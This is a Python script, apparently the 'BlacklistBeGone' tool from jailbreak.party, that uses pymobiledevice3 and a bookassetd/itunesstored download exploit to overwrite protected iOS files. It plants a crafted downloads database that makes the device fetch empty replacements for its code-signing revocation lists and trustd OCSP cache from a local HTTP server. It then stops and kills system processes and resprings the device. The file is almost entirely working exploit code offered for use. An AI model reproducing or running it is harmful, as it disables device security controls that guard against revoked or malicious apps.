import platform
import sys
import traceback
import subprocess
import atexit
import concurrent
import os
import posixpath
import queue
import socket
import sqlite3
import shutil
import time
import threading
import functools
import plistlib
from pathlib import Path
from threading import Timer
from http.server import HTTPServer, SimpleHTTPRequestHandler

import asyncio
import click
import requests
from packaging.version import parse as parse_version
from pymobiledevice3.cli.cli_common import Command
from pymobiledevice3.exceptions import NoDeviceConnectedError, PyMobileDevice3Exception, DeviceNotFoundError
from pymobiledevice3.lockdown import LockdownClient
from pymobiledevice3.lockdown_service_provider import LockdownServiceProvider
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.installation_proxy import InstallationProxyService
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.os_trace import OsTraceService
from pymobiledevice3.services.dvt.dvt_secure_socket_proxy import DvtSecureSocketProxyService
from pymobiledevice3.tunneld.api import async_get_tunneld_devices
from pymobiledevice3.services.os_trace import OsTraceService
from pymobiledevice3.remote.remote_service_discovery import RemoteServiceDiscoveryService
from pymobiledevice3.services.dvt.instruments.process_control import ProcessControl

def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def start_http_server():
    handler = functools.partial(SimpleHTTPRequestHandler)
    httpd = HTTPServer(("0.0.0.0", 0), handler)
    info_queue.put((get_lan_ip(), httpd.server_port))
    httpd.serve_forever()

def create_blacklist_exploit_files(ip, port, uuid, lockdown):
    
   
    blacklist_files = {
        "Rejections.plist": plistlib.dumps({}),
        "AuthListBannedUpps.plist": plistlib.dumps({}),
        "AuthListBannedCdHashes.plist": plistlib.dumps({}),
        "ocspcache.sqlite3": b'',
        "ocspcache.sqlite3-shm": b'',
        "ocspcache.sqlite3-wal": b'',
    }
    
 
    temp_dir = "temp_exploit"
    os.makedirs(temp_dir, exist_ok=True)

    for filename, content in blacklist_files.items():
        with open(os.path.join(temp_dir, filename), "wb") as f:
            f.write(content)
    
    
    shutil.copyfile("downloads.28.sqlitedb", "tmp_blacklist.downloads.28.sqlitedb")
    conn = sqlite3.connect("tmp_blacklist.downloads.28.sqlitedb")
    cursor = conn.cursor()
    
    
    cursor.execute("DELETE FROM asset")
    
    
    blacklist_paths = {
        "Rejections.plist": f"/private/var/db/MobileIdentityData/Rejections.plist",
        "AuthListBannedUpps.plist": f"/private/var/db/MobileIdentityData/AuthListBannedUpps.plist",
        "AuthListBannedCdHashes.plist": f"/private/var/db/MobileIdentityData/AuthListBannedCdHashes.plist",
        "ocspcache.sqlite3": f"/private/var/protected/trustd/private/ocspcache.sqlite3",
        "ocspcache.sqlite3-shm": f"/private/var/protected/trustd/private/ocspcache.sqlite3-shm",
        "ocspcache.sqlite3-wal": f"/private/var/protected/trustd/private/ocspcache.sqlite3-wal",
    }
    
    
    download_id = 1000
    for filename, local_path in blacklist_paths.items():
        url = f"http://{ip}:{port}/{filename}"
        cursor.execute("""
            INSERT INTO asset (download_id, local_path, url, status, bytes_received, bytes_total)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (download_id, local_path, url, 4, 0, 0))
        download_id += 1
    
    conn.commit()
    conn.close()
    
   
    mg_contents = {
        "CacheExtra": {
            "0+nc/Udy4WNG8S+Q7a/s1A": lockdown.get_value(key="ProductType")
        },
        "CacheVersion": lockdown.get_value(key="BuildVersion")
    }
    
    with open("temp_blacklist.com.apple.MobileGestalt.plist", "wb") as f:
        plistlib.dump(mg_contents, f)
    
    return temp_dir

def main_blacklist_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxyService):
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()
    ip, port = info_queue.get()
    print(f"Hosting temporary http server on: http://{ip}:{port}/")

    afc = AfcService(lockdown=service_provider)
    pc = ProcessControl(dvt)
    
    
    temp_dir = create_blacklist_exploit_files(ip, port, "", service_provider)
    
    
    try:
        pc.launch("com.apple.iBooks")
    except Exception as e:
        click.secho(f"Error launching Books app: {e}", fg="red")
        return
    
    click.secho("Finding bookassetd container UUID...", fg="yellow")
    click.secho("Please open Books app and download a book to continue.", fg="yellow")
    
    uuid = ""
    for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
        if (posixpath.basename(syslog_entry.filename) != 'bookassetd') or \
                not "/Documents/BLDownloads/" in syslog_entry.message:
            continue
        uuid = syslog_entry.message.split("/var/containers/Shared/SystemGroup/")[1] \
                .split("/Documents/BLDownloads")[0]
        click.secho(f"Found bookassetd container UUID: {uuid}", fg="yellow")
        with open("uuid.txt", "w") as f:
            f.write(uuid)
        break
    
    if not uuid:
        click.secho("Could not find bookassetd UUID. Trying to continue...", fg="yellow")
    
   
    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
    pid_bookassetd = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
    pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
    
    if pid_bookassetd:
        click.secho(f"Stopping bookassetd pid {pid_bookassetd}...", fg="yellow")
        pc.signal(pid_bookassetd, 19)
    if pid_books:
        click.secho(f"Killing Books pid {pid_books}...", fg="yellow")
        pc.kill(pid_books)
    
   
    click.secho("Uploading temporary MobileGestalt file...", fg="yellow")
    afc.push("temp_blacklist.com.apple.MobileGestalt.plist", "com.apple.MobileGestalt.plist")
    
    
    click.secho("Uploading modified downloads.28.sqlitedb for blacklist removal...", fg="yellow")
    afc.push("tmp_blacklist.downloads.28.sqlitedb", "Downloads/downloads.28.sqlitedb")
    afc.push("tmp_blacklist.downloads.28.sqlitedb-shm", "Downloads/downloads.28.sqlitedb-shm")
    afc.push("tmp_blacklist.downloads.28.sqlitedb-wal", "Downloads/downloads.28.sqlitedb-wal")
    
    
    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
    pid_itunesstored = next((pid for pid, p in procs.items() if p['ProcessName'] == 'itunesstored'), None)
    if pid_itunesstored:
        click.secho(f"Killing itunesstored pid {pid_itunesstored}...", fg="yellow")
        pc.kill(pid_itunesstored)
    
    
    click.secho("Waiting for itunesstored to download blacklist files...", fg="yellow")
    success_count = 0
    for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
        if (posixpath.basename(syslog_entry.filename) == 'itunesstored'):
            if "Install complete for download:" in syslog_entry.message:
                success_count += 1
                click.secho(f"Download completed: {success_count}/6", fg="green")
            elif "Failed" in syslog_entry.message:
                click.secho("Download failed, retrying...", fg="yellow")
        
        if success_count >= 6:  # Все 6 файлов блэклиста
            break
    
    
    click.secho("Cleaning up temporary files...", fg="yellow")
    if os.path.exists("tmp_blacklist.downloads.28.sqlitedb"):
        os.remove("tmp_blacklist.downloads.28.sqlitedb")
    if os.path.exists("tmp_blacklist.downloads.28.sqlitedb-shm"):
        os.remove("tmp_blacklist.downloads.28.sqlitedb-shm")
    if os.path.exists("tmp_blacklist.downloads.28.sqlitedb-wal"):
        os.remove("tmp_blacklist.downloads.28.sqlitedb-wal")
    if os.path.exists("temp_blacklist.com.apple.MobileGestalt.plist"):
        os.remove("temp_blacklist.com.apple.MobileGestalt.plist")
    
    
    afc.push("crash_on_purpose", "crash_on_purpose")
    
    click.secho("Respringing device...", fg="green")
    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
    pid = next((pid for pid, p in procs.items() if p['ProcessName'] == 'backboardd'), None)
    if pid:
        pc.kill(pid)
    
    click.secho("Blacklist removal complete!", fg="green")

def _run_async_rsd_connection(address, port, callback_func):
    async def async_connection():
        async with RemoteServiceDiscoveryService((address, port)) as rsd:
            loop = asyncio.get_running_loop()

            def run_blocking_callback():
                with DvtSecureSocketProxyService(rsd) as dvt:
                    callback_func(rsd, dvt)

            await loop.run_in_executor(None, run_blocking_callback)

    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            with concurrent.futures.ThreadPoolExecutor() as executor:
                future = executor.submit(asyncio.run, async_connection())
                future.result()
        else:
            loop.run_until_complete(async_connection())
    except RuntimeError:
        asyncio.run(async_connection())

def exit_func(tunnel_proc):
    tunnel_proc.terminate()

async def create_tunnel(udid):
    # TODO: check for Windows
    tunnel_process = subprocess.Popen(f"sudo pymobiledevice3 lockdown start-tunnel --script-mode --udid {udid}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    atexit.register(exit_func, tunnel_process)
    while True:
        output = tunnel_process.stdout.readline()
        if output:
            rsd_val = output.decode().strip()
            break
        if tunnel_process.poll() is not None:
            error = tunnel_process.stderr.readlines()
            if error:
                not_connected = None
                admin_error = None
                for i in range(len(error)):
                    if (error[i].find(b'connected') > -1):
                        not_connected = True
                    if (error[i].find(b'admin') > -1):
                        admin_error = True
                if not_connected:
                    print("It seems like your device isn't connected.", error)
                elif admin_error:
                    print("It seems like you're not running this script as admin, which is required.", error)
                else:
                    print("Error opening a tunnel.", error)
                sys.exit()
            break
    rsd_str = str(rsd_val)
    print("Sucessfully created tunnel: " + rsd_str)
    return {"address": rsd_str.split(" ")[0], "port": int(rsd_str.split(" ")[1])}

async def connection_context(udid, callback_func):
    try:
        service_provider = create_using_usbmux(serial=udid)
        marketing_name = service_provider.get_value(key="MarketingName")
        device_build = service_provider.get_value(key="BuildVersion")
        device_product_type = service_provider.get_value(key="ProductType")
        device_version = parse_version(service_provider.product_version)
        click.secho(f"Got device: {marketing_name} (iOS {device_version}, Build {device_build})", fg="blue")
        click.secho("Please keep your device unlocked during the process.", fg="blue")
        
        if device_version >= parse_version('17.0'):
            available_address = await create_tunnel(udid)
            if available_address:
                _run_async_rsd_connection(available_address["address"], available_address["port"], callback_func)
            else:
                raise Exception("An error occurred getting tunnels addresses...")
        else:
            with DvtSecureSocketProxyService(lockdown=service_provider) as dvt:
                callback_func(service_provider, dvt)
    except OSError:
        pass
    except DeviceNotFoundError:
        click.secho("Device not found. Make sure it's unlocked.", fg="red")
    except Exception as e:
        raise Exception(f"Connection not established... {e}")

def get_nice_ios_version_string(lockdown):
    os_names = {
        "iPhone": "iOS",
        "iPad": "iPadOS",
        "iPod": "iOS",
        "AppleTV": "tvOS",
        "Watch": "watchOS",
        "AudioAccessory": "HomePod Software Version",
        "RealityDevice": "visionOS",
    }
    device_class = lockdown.get_value(key="DeviceClass")
    product_version = lockdown.get_value(key="ProductVersion")
    os_name = (os_names[device_class] + " " + product_version) if device_class in os_names else ""
    return os_name

def menu():
    try:
        lockdown = create_using_usbmux()
    except NoDeviceConnectedError:
        print("No device connected!")
        print("Please connect your device and try again.")
        if platform.system() == "Windows" and getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
            input("Press Enter to exit...")
        sys.exit(1)
    
    print(f"""
               BlacklistBeGone v1.2
                by jailbreak.party
          
             Special thanks to Mineek
             Using bookassetd exploit

      Connected to {lockdown.get_value(key="DeviceName")} ({get_nice_ios_version_string(lockdown)})
        
         === Please select an option. ===
    """)
    print("""
      [1] : Remove Blacklist (using exploit)
            
      [0] : Exit
    """)
    
    try:
        user_input = input("Select an option: ")
        if user_input.strip() == "":
            input("Please select an option. Press Enter to continue.")
            menu()
        
        option = int(user_input)
        
        if option == 1:
            print("Preparing blacklist removal using bookassetd exploit...")
            udid = lockdown.udid
            
            
            with open("crash_on_purpose", "wb") as f:
                f.write(b'')
            
            
            if not os.path.exists("downloads.28.sqlitedb"):
                print("Error: downloads.28.sqlitedb not found!")
                print("Please make sure you have the required exploit files.")
                return
            
            global info_queue
            info_queue = queue.Queue()
            
            
            asyncio.run(connection_context(udid, main_blacklist_callback))
            
        elif option == 0:
            print("Thanks for using BlacklistBeGone!")
            if platform.system() == "Windows" and getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
                input("Press Enter to exit...")
            sys.exit()
        else:
            input("Please select a valid option. Press Enter to continue.")
            menu()
    except ValueError:
        input("Please enter a valid number. Press Enter to continue.")
        menu()

if __name__ == "__main__":
   
    if len(sys.argv) > 1:
       
        if len(sys.argv) != 3:
            print("Usage: python run.py <udid> /path/to/com.apple.MobileGestalt.plist")
            exit(1)
        
        mg_file = sys.argv[2]
        info_queue = queue.Queue()
        os.chdir(os.path.dirname(os.path.abspath(__file__)))
        asyncio.run(connection_context(sys.argv[1], main_callback))
    else:
        
        menu()
